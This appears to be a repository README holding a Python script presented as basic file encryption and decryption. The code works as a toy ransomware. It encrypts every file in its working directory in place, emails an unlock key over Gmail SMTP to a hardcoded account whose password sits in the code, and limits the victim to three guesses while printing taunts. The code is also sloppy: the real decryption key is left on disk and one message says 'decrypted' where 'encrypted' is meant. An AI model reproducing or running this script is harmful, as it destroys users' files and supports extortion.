# Encryption_Decryption
Basic level file encryption and decryption code

import os
from cryptography.fernet import Fernet
import traceback

email_add = 'fakeid2practice@gmail.com'   #create a fake account for the purpose
email_pass = 'fakeidprac'
files = []
count = 0
for file in os.listdir():
    if file == 'encrypt_decrypt.py' or file == 'The_key.key' or file == 'decrypt.py':   # create a condition to leave out some specified file of your liking 
    # Can ommit this line too.
        continue
    if os.path.isfile(file):     # Counts the number of files to encrypt
        count += 1
        files.append(file)


def key_generator():                   # Creates a key for encrypting purpose and utilizing back to decrypt
    key = Fernet.generate_key()
    return key


def secret_key_generator():              # Generates a key that would be given as paas-code for unlocking the decryption process
    skey = Fernet.generate_key()
    # key2 = write_key(key)
    return skey


def send_mail(email_id, email_password, msg):       # Sends the secret key to your mentioned email id  
    import smtplib
    try:
        server = smtplib.SMTP('smtp.gmail.com', port=587)
        server.starttls()
        server.login(email_id, email_password)
        server.sendmail(email_id, email_id, msg)
        server.quit()
    except Exception as e:
        traceback.print_exc(e)


loop_counter = 0

def decryptor(ki):                              # Decryption Process
    global loop_counter
    user_password = None
    while (user_password != ki):
        user_password = input('Enter the key: \n').encode()     # The pass_Code that should be entered correctly to start the decryption process
        # user_password = key
        loop_counter += 1                                       # Counter is set to give a maximum chance of 3 as mentioned to crack the pass_code
        if loop_counter == 3:
            break
        if (user_password != ki):
            # number = loop_counter - 1
            print("Oops! your fucked...its the wrong password..Files are still decrypted! :(")
            print('You CAN try again but for only few more times... :)')
        else:
            with open('The_key.key', 'rb') as file:
                secretkey = file.read()                      # Reads the key stored in the file to decrypt the files
            for file in files:
                with open(file, 'rb') as thefile:
                    contents = thefile.read()
                contents_decrypted = Fernet(secretkey).decrypt(contents)
                with open(file, 'wb') as thefile:
                    thefile.write(contents_decrypted)
            print('All your files are now decrypted..Enjoy! :)')
            print(f'No. of encrypted file: {count}')
    if loop_counter == 3:
        print('Your Done For!..Bye')                           # End Game :)


if __name__ == '__main__':
                                                            
    pass_key = key_generator()
    print(pass_key)                                         # Storing the encryption key in a file the call the functions
    with open('The_key.key', 'wb') as file:
        file.write(pass_key)
    for file in files:
        with open(file, 'rb') as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(pass_key).encrypt(contents)
        with open(file, 'wb') as thefile:
            thefile.write(contents_encrypted)

    print('All your files are now Encrypted!')
    print(f'No. of encrypted file: {count}')
    # os.system("python decrypt.py")
    s_key = secret_key_generator()
    send_mail(email_add, email_pass, s_key)
    secret_key = decryptor(s_key)
